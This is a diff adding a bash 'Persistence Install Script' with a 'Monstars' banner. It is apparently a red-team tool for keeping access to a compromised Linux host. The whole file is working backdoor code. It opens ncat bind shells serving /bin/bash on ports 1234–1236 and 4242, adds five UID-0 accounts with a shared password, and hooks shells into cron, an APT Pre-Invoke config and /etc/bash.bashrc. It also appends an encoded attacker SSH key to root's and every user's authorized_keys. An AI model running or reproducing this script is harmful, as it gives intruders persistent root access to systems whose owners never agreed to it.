@@ -1,0 +1,82 @@
+#!/bin/bash
+
+# Install Persistence
+echo ""
+echo """
+
+   _____                          __                       
+  /     \   ____   ____   _______/  |______ _______  ______
+ /  \ /  \ /  _ \ /    \ /  ___/\   __\__  \\\_  __ \/  ___/
+/    Y    (  <_> )   |  \\___  \  |  |  / __ \|  | \/\___ \ 
+\____|__  /\____/|___|  /____  > |__| (____  /__|  /____  >
+        \/            \/     \/            \/           \/
+============== Persistence Install Script ================="""
+echo ""
+echo ""
+
+if [[ $(id -u) -ne 0 ]]; then
+    echo -e "[-] You must not run this installer as root.\nQuitting!";
+    exit 1;
+fi
+command -v ncat >/dev/null 2>&1
+
+
+if [ "$?" != "0" ]; then
+    echo "[*] Netcat not found - installing via apt"
+#    apt-get update
+    apt-get install -y nmap
+fi
+
+command -v gcc >/dev/null 2>&1
+if [ "$?" != "0" ]; then
+    echo "[*] Gcc not found - installing via apt"
+#    apt-get update
+    apt-get install -y gcc
+fi
+
+# Open up netcat
+#echo -e "\n[+] Opening netcat listner\n"
+nohup ncat -lvkp 1236 -e /bin/bash 2> /dev/null &
+
+
+echo -e "\n[+] Adding a Root User's\n"
+usernames=("pound" "bang" "bupkus" "blanko" "nawt")
+for name in ${usernames[@]}; do
+	echo -e "\n[-] Checking if user $name exists"
+	id -u $name >/dev/null 2>&1
+	if [ "$?" != "0" ]; then
+       		echo -e "[-] User $name doesn't exist, installing user"
+		useradd -ou 0 -g 0 $name
+		echo -e "spacejam\nspacejam" | passwd $name
+	else
+		echo -e "[!] User $name already exists, skipping!"
+	fi
+done
+
+echo -e "\n[+] Adding a Crontab Reverse Shell"
+(crontab -l ; echo "@reboot sleep 200 && ncat -lvkp 4242 -e /bin/bash")|crontab 2> /dev/null
+
+echo -e "\n[+] Adding backdoor into APT\n"
+echo 'APT::Update::Pre-Invoke {"nohup ncat -lvkp 1235 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/40httpconf
+
+echo -e "\n[+] Adding netcat listener for SSH startup"
+echo -e "\nif [[ -n \$SSH_CONNECTION ]] ; then
+        nohup ncat -lvkp 1234 -e /bin/bash 2> /dev/null &
+fi" >> /etc/bash.bashrc
+
+echo -e "\n[+] Add SSH Keys"
+for d in /home/* ; do
+	if [ ! -d "$d/.ssh" ]; then
+		mkdir $d/.ssh
+		chown ${d:6}:${d:6} $d/.ssh
+	fi
+	echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDV3c1UjdNUVpqbk5lZWFSQnZteFhYRUJwcjE2Wkh0NFhNbHRzT2hYMTZEMldNL2orQkM4YjFxQzN4Q0pEZlJIZWc1T3lqN3JxMWdjWWNLS2crczhWWUdyN1NFcC84WUY0VW5yUEZZQThIMG81bEVVRlR2eFpvWkhhN3htNmxPZ1I0WjFOMk5iUFU0S0NtaVA0Vy9GOHhzUGdHVWcxQUdkWWxRb0ljRk9KQjNrblJuV1JxUU1udDRFa3B6dkxrek5ZSmhoUXBHU1dUbkxSdmtJMmdtZmtlWTVydEEzVXpydWZSb3h6ZW5MV0ZjZ2dOMk11S1M5YlNJb1A5QjBmMWVZMy9COHpHS05OclMwZUUyWFVVU2J4eFhGK2d6QVpFRGZKS1cvSjVBNlFBKzJ0dHE5dnlOTmt0UnVpRSs4Qi9iWTdyRTRyQkRCa3BNbTROQUtvbVpmaXNmdGNtWUo4UEZNblc5V0ZwVWFqTWthbEo1YVBsMW9Pc084UU5COGRtRm5NK3ZvU2Z3QS9XQUZmVFFSMHA3WXQveEFCTmhobkN5bjN1bHlTMU1LbjA2SFdtQ3ZEbjJYalc3UVpxelExTzFmUVg5ZzY2MjlmVTBSTlFCUCttRk91SjR1QVdDN3VMOXlQMlI2QkFaUWZqdmUvQVphYytUNm5XajlXSVdyeTZzd2s9IG1vbnN0YXJzQHRoZVNwYWNlSmFt" | base64 --decode >> $d/.ssh/authorized_keys 2> /dev/null
+	chown ${d:6}:${d:6} $d/.ssh/authorized_keys
+	echo "[-] Added SSH key to ${d:6}"
+done
+
+echo -e "\n[+] Add SSH Keys to root"
+if [ ! -d "/root/.ssh" ]; then
+	mkdir /root/.ssh
+fi
+echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDV3c1UjdNUVpqbk5lZWFSQnZteFhYRUJwcjE2Wkh0NFhNbHRzT2hYMTZEMldNL2orQkM4YjFxQzN4Q0pEZlJIZWc1T3lqN3JxMWdjWWNLS2crczhWWUdyN1NFcC84WUY0VW5yUEZZQThIMG81bEVVRlR2eFpvWkhhN3htNmxPZ1I0WjFOMk5iUFU0S0NtaVA0Vy9GOHhzUGdHVWcxQUdkWWxRb0ljRk9KQjNrblJuV1JxUU1udDRFa3B6dkxrek5ZSmhoUXBHU1dUbkxSdmtJMmdtZmtlWTVydEEzVXpydWZSb3h6ZW5MV0ZjZ2dOMk11S1M5YlNJb1A5QjBmMWVZMy9COHpHS05OclMwZUUyWFVVU2J4eFhGK2d6QVpFRGZKS1cvSjVBNlFBKzJ0dHE5dnlOTmt0UnVpRSs4Qi9iWTdyRTRyQkRCa3BNbTROQUtvbVpmaXNmdGNtWUo4UEZNblc5V0ZwVWFqTWthbEo1YVBsMW9Pc084UU5COGRtRm5NK3ZvU2Z3QS9XQUZmVFFSMHA3WXQveEFCTmhobkN5bjN1bHlTMU1LbjA2SFdtQ3ZEbjJYalc3UVpxelExTzFmUVg5ZzY2MjlmVTBSTlFCUCttRk91SjR1QVdDN3VMOXlQMlI2QkFaUWZqdmUvQVphYytUNm5XajlXSVdyeTZzd2s9IG1vbnN0YXJzQHRoZVNwYWNlSmFt" | base64 --decode >> /root/.ssh/authorized_keys 2> /dev/null
